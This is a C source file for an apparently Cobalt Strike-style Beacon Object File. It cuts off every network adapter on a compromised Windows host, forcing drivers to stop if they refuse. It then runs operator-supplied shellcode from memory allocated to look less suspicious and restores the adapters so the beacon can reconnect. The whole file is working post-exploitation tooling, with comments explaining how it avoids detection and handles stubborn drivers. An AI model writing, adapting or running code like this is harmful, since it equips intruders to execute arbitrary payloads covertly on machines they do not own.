/*
 * bof_nic_exec.c
 *
 * Flow (single thread):
 *   1. Disable ALL NICs  (POLITE first, fallback ABSOLUTE if driver vetoes)
 *   2. Execute shellcode inline (blocking)
 *   3. Sleep cooldown_ms
 *   4. Re-enable NICs → beacon reconnects
 *
 * Args: b:shellcode_bytes  i:cooldown_ms
 */

#include <windows.h>
#include <cfgmgr32.h>
#include "beacon.h"

/* ── Imports ─────────────────────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT void      WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT void      WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT int       WINAPI KERNEL32$lstrlenW(LPCWSTR);

DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_Device_ID_List_SizeW(PULONG, PCWSTR, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_Device_ID_ListW(PCWSTR, PZZWSTR, ULONG, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Locate_DevNodeW(PDEVINST, DEVINSTID_W, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_DevNode_Status(PULONG, PULONG, DEVINST, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Disable_DevNode(DEVINST, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Enable_DevNode(DEVINST, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Open_DevNode_Key(DEVINST, REGSAM, ULONG,
                                                               REGDISPOSITION, PHKEY, ULONG);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD,
                                                            LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegCloseKey(HKEY);

/* ── Macros ──────────────────────────────────────────────────────────── */
#define HALLOC(n) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define HFREE(p)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

/*
 * cfgmgr32 constants — redefined to avoid MinGW header version issues
 *
 * CM_GETIDLIST_FILTER_CLASS  = 0x200  (Win8+; Win7 returns CR_INVALID_FLAG → fallback)
 * CM_LOCATE_DEVNODE_PHANTOM  = 0x001  (include disabled/phantom devices)
 * DN_STARTED                 = 0x008  (driver is loaded and running)
 * CM_PROB_DISABLED           = 0x016  = 22 decimal (device disabled by user/policy)
 * CM_DISABLE_POLITE          = 0x000  (ask driver via IRP_MN_QUERY_STOP; driver can veto)
 * CM_DISABLE_ABSOLUTE        = 0x001  (skip query, force IRP_MN_STOP; no veto possible)
 * CM_DISABLE_UI_NOT_OK       = 0x004  (suppress any UI dialog — required for Session 0)
 * CM_REGISTRY_SOFTWARE       = 0x001  (open driver's software key, not hardware key)
 */
#define MY_CM_GETIDLIST_FILTER_CLASS  0x00000200UL
#define MY_CM_GETIDLIST_FILTER_NONE   0x00000000UL
#define MY_CM_LOCATE_PHANTOM          0x00000001UL
#define MY_DN_STARTED                 0x00000008UL
#define MY_CM_PROB_DISABLED           0x00000016UL
#define MY_CM_DISABLE_POLITE          0x00000000UL
#define MY_CM_DISABLE_ABSOLUTE        0x00000001UL
#define MY_CM_DISABLE_UI_NOT_OK       0x00000004UL
#define MY_CM_REGISTRY_SOFTWARE       0x00000001UL

#define MAX_NICS 64

/* ── is_net_adapter ──────────────────────────────────────────────────── */
/*
 * Used only on the Win7 fallback path where no class filter is applied.
 * A Net adapter has NetCfgInstanceId in its software registry key.
 * buf is intentionally tiny — ERROR_MORE_DATA still means the value exists.
 */
static BOOL is_net_adapter(DEVINST devInst)
{
    HKEY hKey;
    if (CFGMGR32$CM_Open_DevNode_Key(devInst, KEY_READ, 0,
            RegDisposition_OpenExisting, &hKey, MY_CM_REGISTRY_SOFTWARE) != CR_SUCCESS)
        return FALSE;

    WCHAR buf[8];
    DWORD type, sz = sizeof(buf);
    LONG r = ADVAPI32$RegQueryValueExW(hKey, L"NetCfgInstanceId",
                                        NULL, &type, (LPBYTE)buf, &sz);
    ADVAPI32$RegCloseKey(hKey);
    return (r == ERROR_SUCCESS || r == ERROR_MORE_DATA);
}

/* ── disable_one ─────────────────────────────────────────────────────── */
/*
 * Try POLITE disable first (driver can refuse via IRP_MN_QUERY_STOP).
 * If driver vetoes, escalate to ABSOLUTE (no query, force stop).
 * This avoids crashing VMware/VirtualBox virtual NICs that don't handle
 * ABSOLUTE cleanly, while still handling stubborn enterprise NIC drivers.
 */
static CONFIGRET disable_one(DEVINST devInst)
{
    CONFIGRET cr = CFGMGR32$CM_Disable_DevNode(devInst,
                       MY_CM_DISABLE_POLITE | MY_CM_DISABLE_UI_NOT_OK);
    if (cr != CR_SUCCESS)
        cr = CFGMGR32$CM_Disable_DevNode(devInst,
                 MY_CM_DISABLE_ABSOLUTE | MY_CM_DISABLE_UI_NOT_OK);
    return cr;
}

/* ── nic_off_all ─────────────────────────────────────────────────────── */
static void nic_off_all(DEVINST *saved, int *savedCount)
{
    ULONG  listSize = 0;
    PCWSTR filter   = L"Net";
    ULONG  flags    = MY_CM_GETIDLIST_FILTER_CLASS;
    BOOL   classOk  = TRUE;

    /* Win7 returns CR_INVALID_FLAG for CM_GETIDLIST_FILTER_CLASS → fallback */
    CONFIGRET cr = CFGMGR32$CM_Get_Device_ID_List_SizeW(&listSize, filter, flags);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] SizeW(Net) cr=%u listSize=%lu\n",
                 (unsigned)cr, (unsigned long)listSize);

    /*
     * listSize <= 2 means empty list (just the double-null terminator \0\0).
     * Either class filter unsupported (Win7) or no Net devices — fall back
     * to unfiltered enumeration + is_net_adapter() check.
     */
    if (cr != CR_SUCCESS || listSize <= 2) {
        filter  = NULL;
        flags   = MY_CM_GETIDLIST_FILTER_NONE;
        classOk = FALSE;
        cr = CFGMGR32$CM_Get_Device_ID_List_SizeW(&listSize, filter, flags);
        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] SizeW(all) cr=%u listSize=%lu\n",
                     (unsigned)cr, (unsigned long)listSize);
        if (cr != CR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[!] CM_Get_Device_ID_List_SizeW failed: %u\n", cr);
            return;
        }
    }

    WCHAR *devList = (WCHAR*)HALLOC(listSize * sizeof(WCHAR));
    if (!devList) { BeaconPrintf(CALLBACK_ERROR, "[!] HeapAlloc failed\n"); return; }

    cr = CFGMGR32$CM_Get_Device_ID_ListW(filter, devList, listSize, flags);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] GetListW cr=%u\n", (unsigned)cr);
    if (cr != CR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CM_Get_Device_ID_ListW failed: %u\n", cr);
        HFREE(devList);
        return;
    }

    *savedCount = 0;

    for (WCHAR *p = devList; *p; p += KERNEL32$lstrlenW(p) + 1) {
        DEVINST devInst;
        if (CFGMGR32$CM_Locate_DevNodeW(&devInst, p, MY_CM_LOCATE_PHANTOM) != CR_SUCCESS)
            continue;

        /* On unfiltered path: skip non-network devices */
        if (!classOk && !is_net_adapter(devInst))
            continue;

        ULONG status = 0, prob = 0;
        if (CFGMGR32$CM_Get_DevNode_Status(&status, &prob, devInst, 0) != CR_SUCCESS)
            continue;

        /* Skip: not running, or already disabled */
        if (!(status & MY_DN_STARTED))   continue;
        if (prob == MY_CM_PROB_DISABLED) continue;

        /* Guard first: if table is full, skip rather than disable-without-tracking */
        if (*savedCount >= MAX_NICS) {
            BeaconPrintf(CALLBACK_ERROR, "  [!] MAX_NICS reached, skipping: %S\n", p);
            continue;
        }

        cr = disable_one(devInst);
        if (cr == CR_SUCCESS) {
            saved[(*savedCount)++] = devInst;
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] Disabled: %S\n", p);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  [-] Skip (cr=%u): %S\n", (unsigned)cr, p);
        }
    }

    HFREE(devList);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] NIC-OFF: %d adapter(s) down\n", *savedCount);
}

/* ── nic_on_all ──────────────────────────────────────────────────────── */
static void nic_on_all(DEVINST *saved, int savedCount)
{
    int restored = 0;
    for (int i = 0; i < savedCount; i++) {
        CONFIGRET cr = CFGMGR32$CM_Enable_DevNode(saved[i], 0);
        if (cr == CR_SUCCESS)
            restored++;
        else
            BeaconPrintf(CALLBACK_ERROR,
                         "  [!] Enable failed idx=%d cr=%u\n", i, (unsigned)cr);
    }
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] NIC-ON: %d/%d adapter(s) restored\n", restored, savedCount);
}

/* ── shellcode_exec ──────────────────────────────────────────────────── */
static void shellcode_exec(void *scBuf, int scLen, DWORD cooldown_ms)
{
    /* Allocate RW, copy, flip to RX — avoids RWX page (slightly less suspicious) */
    void *mem = KERNEL32$VirtualAlloc(NULL, (SIZE_T)(scLen + 1),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] VirtualAlloc=%s\n", mem ? "ok" : "NULL");
    if (!mem) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return;
    }

    KERNEL32$RtlMoveMemory(mem, scBuf, (SIZE_T)scLen);

    /* Append 0xC3 (RET) past the shellcode as a safety net in case shellcode
     * falls off its end without an explicit return instruction. */
    ((unsigned char*)mem)[scLen] = 0xC3;
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] copied %d bytes + 0xC3\n", scLen);

    DWORD old;
    KERNEL32$VirtualProtect(mem, (SIZE_T)(scLen + 1), PAGE_EXECUTE_READ, &old);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] VirtualProtect RX ok\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Executing shellcode...\n");
    ((void(*)(void))mem)();
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] shellcode returned\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cooling down %lu ms...\n", (unsigned long)cooldown_ms);
    KERNEL32$Sleep(cooldown_ms);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] Sleep done\n");
}

/* ── Entry point ─────────────────────────────────────────────────────── */
void go(char *args, int len)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] go() len=%d\n", len);

    /* State lives on the stack — BOF loader may not zero .bss reliably */
    DEVINST saved[MAX_NICS];
    int     savedCount = 0;

    datap parser;
    BeaconDataParse(&parser, args, len);

    int   scLen  = 0;
    char *scData = BeaconDataExtract(&parser, &scLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] scData=%s scLen=%d\n",
                 scData ? "ok" : "NULL", scLen);

    int cooldown = BeaconDataInt(&parser);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] cooldown=%d\n", cooldown);

    if (!scData || scLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No shellcode data\n");
        return;
    }
    if (cooldown < 0) cooldown = 0;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] bof-nic-exec | %d bytes | cooldown=%d ms\n", scLen, cooldown);

    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] >>> nic_off_all\n");
    nic_off_all(saved, &savedCount);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] <<< nic_off_all saved=%d\n", savedCount);

    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] >>> shellcode_exec\n");
    shellcode_exec(scData, scLen, (DWORD)cooldown);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] <<< shellcode_exec done\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] >>> nic_on_all\n");
    nic_on_all(saved, savedCount);
    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] <<< nic_on_all done\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done — beacon reconnecting...\n");
}
